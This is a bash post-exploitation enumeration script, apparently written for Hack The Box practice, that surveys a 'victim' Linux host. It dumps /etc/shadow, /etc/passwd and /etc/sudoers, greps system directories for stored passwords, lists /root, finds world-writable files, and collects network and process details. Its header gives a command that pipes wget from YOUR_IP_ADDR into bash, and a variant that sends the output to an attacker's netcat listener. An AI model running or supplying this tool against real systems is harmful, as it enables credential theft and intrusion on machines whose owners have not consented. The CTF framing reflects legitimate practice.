#! /bin/bash
# Scripted by BashSTuff 
# Ver1.0
##############################################################################################
###                         GNU/Linux Survey Script                                        ###
##############################################################################################
# 
#  Survey was made for GNU/Linux, but might be useful on Unix machines.
#  Used the visuals from HIGH ON COFFEE's Linux Enumeration script (http://highon.coffee) 
#  I wrote this mainly for Hack The Box machines because I wanted something simple to help enumerate a victim.
#
# Do one of the following:
#
# 1) On TARGET machine: bash linSurvey.sh (file on TARGET)
#	a) OPTIONAL: bash linSurvey.sh|tee /tmp/linSurvey.txt (two files on TARGET)
#
# 2) On TARGET machine: wget YOUR_IP_ADDR/linSurvey.sh -O-|bash  (You'll need a python HTTP server on your attack machine: python3 -m http.server 80)
#	a) OPTIONAL: wget YOUR_IP_ADDR/linSurvey.sh -O-|bash|nc -nvvq1 YOUR_IP_ADDR YOUR_PORT  (saves a file on your attack machine only)
#		i) Have a netcat listener on your attack machine BEFORE: nc -nvvls YOUR_IP_ADDR -p YOUR_PORT > linSurvey.txt && cat linSurvey.txt
##


BLACK="\033[30m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
PINK="\033[35m"
CYAN="\033[36m"
WHITE="\033[37m"
NORMAL="\033[0;39m"
CAT=/bin/cat
RELEASE=`cat /etc/*release`
FIND=/usr/bin/find
SUBSECTION=""

$CAT << "EOF"
  _      _        _____                            
 | |    (_)      / ____|                           
 | |     _ _ __ | (___  _   _ _ ____   _____ _   _ 
 | |    | | '_ \ \___ \| | | | '__\ \ / / _ \ | | |
 | |____| | | | |____) | |_| | |   \ V /  __/ |_| |
 |______|_|_| |_|_____/ \__,_|_|    \_/ \___|\__, |
                                              __/ |
                                             |___/ 
EOF

SECTION_BANNER () {

printf "$BLUE"
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
printf "##"
printf "\n"
printf "$RED"
printf "$BLUE## $RED $SUBSECTION"
printf "\n"
printf "$BLUE"
printf "##" 
printf "\n"
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#'
printf "\n"
printf "$NORMAL"

}

## User, tasks, and sign-in info ## 
SUBSECTION="Users, Schedule Tasks, and Logon Information"
SECTION_BANNER


printf "$GREEN Curent User and Groups: $NORMAL \n"
/usr/bin/id
printf "\n"
printf "$GREEN Password file: $NORMAL \n"
$CAT /etc/passwd
printf "$CYAN Accounts with shells $NORMAL"
printf "\n"
$CAT /etc/passwd |grep sh$
printf "\n"
printf "$GREEN Shadow file: $NORMAL \n"
$CAT /etc/shadow
printf "\n"
printf "$GREEN Group file: $NORMAL \n"
$CAT /etc/group
printf "\n"
printf "$GREEN Sudoers file: $NORMAL \n"
$CAT /etc/sudoers
printf "\n"
printf "$GREEN Currently logged on user(s): $NORMAL \n"
/usr/bin/w
printf "\n"
printf "$GREEN Last time user(s) logged on: $NORMAL \n"
/usr/bin/last -F
printf "\n"
printf "$GREEN Listing of cron jobs: $NORMAL \n"
/bin/ls -Ralh /etc/cron*
printf "\n"
printf "$GREEN The following files contain these words: pwd, password, or pass. \n"
printf " One of them may contain creds. Please check them for passwords: $NORMAL \n"
printf "Matching files in $CYAN /VAR: $NORMAL"
printf "\n"
$FIND /var -type f 2>/dev/null |xargs grep -Eli 'password|pwd|pass' 2>/dev/null |xargs ls -lar
printf "Matching files in $CYAN /ETC: $NORMAL"
printf "\n"
$FIND /etc -type f 2>/dev/null |xargs grep -Eli 'password|pwd|pass' 2>/dev/null |xargs ls -lar
printf "\n"


## OS info ## 
SUBSECTION="Operating System Information"
SECTION_BANNER

printf "$GREEN OS version: $NORMAL \n"
$CAT /etc/issue
printf "\n"
printf "$GREEN OS release informaiton: $NORMAL \n" 
$CAT /etc/*release
printf "\n"
printf "$GREEN kernel informaiton: $NORMAL \n"
$CAT /proc/version
printf "\n"

## Network info ##
SUBSECTION="Networking Information"
SECTION_BANNER

printf "\n"
printf "$GREEN Machine Hostname: $NORMAL \n"
/bin/hostname
printf "\n"
printf "$GREEN Network Configuration (if RedHat): $NORMAL \n"
$CAT /etc/sysconfig/network
printf "\n"
printf "$GREEN DNS resolver(s) informaiton: $NORMAL \n"
$CAT /etc/resolv.conf|grep -i nameserver
printf "\n"
printf "$GREEN Network Interfaces: $NORMAL \n"
/sbin/ifconfig -a
printf "\n"
printf "$GREEN Gateway and Routes: $NORMAL \n"
/sbin/route
printf "\n"
printf "$GREEN Current Socket Statics: $NORMAL \n"
/bin/netstat -taunpo
printf "\n"


## Disk info ## 
SUBSECTION="File System Information"
SECTION_BANNER

printf "$GREEN File System Table: $NORMAL \n"
$CAT /etc/fstab
printf "\n"
printf "$GREEN Disk Usage: $NORMAL \n"
/bin/df -Th
printf "\n"
printf "$GREEN Listing of block devices: $NORMAL \n"
/bin/lsblk -a 2>/dev/null
printf "\n"
printf "$GREEN Mount Information: $NORMAL \n"
/bin/mount | column -t
printf "\n"



## files, folders, and perms ## 
SUBSECTION="Files, Folders, and permissions"
SECTION_BANNER

printf "Stuff in $BLUE /HOME: $NORMAL \n"
/bin/ls -Ralh /home 2>/dev/null
printf "Stuff in $RED /ROOT: $NORMAL"
printf "\n"
/bin/ls -Ralh /root
printf "\n"
printf "$GREEN Sticky Bit Directories: $NORMAL"
printf "\n"
$FIND / -type d -perm -1000 2>/dev/null -exec ls -lad {} \;
printf "\n"
printf "$GREEN World Writable Directories: $NORMAL"
printf "\n"
printf "Owned by $BLUE USERS: $NORMAL \n"
$FIND / -wholename '/home/homedir*' -prune -o -type d ! -user root -perm -o+w 2>/dev/null -exec ls -lad  {} \;
printf "Owned by $RED ROOT: $NORMAL \n"
$FIND / -wholename '/home/homedir*' -prune -o -type d -user root -perm -o+w 2>/dev/null -exec ls -lad  {} \;
printf "\n"
printf "$GREEN World Writable Files: $NORMAL"
printf "\n"
$FIND / -wholename '/home/*' -prune -o -wholename '/proc/*' -prune -o -type f -perm -o+w 2>/dev/null -exec ls -hal {} \; 
printf "\n"
#printf "$GREEN Files and Folders created after user creation: $NORMAL"
#printf "\n"


## Proc, pkg, and svc  ## 
SUBSECTION="Processes, Packages, and Services"
SECTION_BANNER

printf "$GREEN Installed OS Packages: $NORMAL"
printf "\n"
if [[ $RELEASE =~ 'debian' ]]; then
  /usr/bin/dpkg -l | awk '{$1=$4=""; print $0}'
else
  /usr/bin/rpm -qa | sort -u
fi
printf "\n"
printf "$GREEN Installed Loadable Kernel Modules: $NORMAL"
printf "\n"
/bin/lsmod
printf "\n"
printf "$GREEN System Services: $NORMAL"
printf "\n"
if [[ -f /bin/systemctl ]]; then
  /bin/systemctl list-unit-files|grep -i enabled|sort
else
  /usr/bin/service --status-all
fi
printf "\n"
printf "$GREEN Running Processes: $NORMAL"
printf "\n"
/bin/ps aux
printf "\n"

SUBSECTION="Linux SurveyCompleted"
SECTION_BANNER
